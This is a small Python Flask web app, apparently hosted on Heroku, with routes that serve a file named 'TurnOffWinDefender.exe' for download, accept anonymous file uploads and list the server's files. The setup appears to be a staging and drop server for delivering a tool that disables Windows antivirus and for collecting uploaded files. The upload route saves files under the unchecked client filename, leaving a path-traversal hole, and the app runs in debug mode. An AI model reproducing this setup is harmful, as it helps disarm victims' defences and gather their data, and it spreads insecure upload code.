from flask import *
from datetime import datetime

import os

app = Flask(__name__)

@app.route('/')
def homepage():
    the_time = datetime.now().strftime("%A, %d %b %Y %l:%M %p")

    return """
    <h1>Hello heroku</h1>
    <p>It is currently {time}.</p>

    <img src="http://loremflickr.com/600/400" />
    """.format(time=the_time)
#===========================download file================================
@app.route('/return-files/')
def return_files_tut():
	try:
		return send_file('TurnOffWinDefender.exe', attachment_filename='TurnOffWinDefender.exe')
	except Exception as e:
		return str(e)
	

	
#========================upload file=====================================
@app.route('/upload')  
def upload():  
    return render_template("file_upload_form.html")  
 
@app.route('/success', methods = ['POST'])  
def success():  
    if request.method == 'POST':  
        f = request.files['file']  
        f.save(f.filename)  
        return render_template("success.html", name = f.filename)  



@app.route('/getinfo')
def getinfo():
    s = ""
    arr = os.listdir(os.path.normpath(os.getcwd()))
    for i in arr :
        s += str(i) + "\n"
    return s


if __name__ == '__main__':
    app.run(debug=True, use_reloader=True)

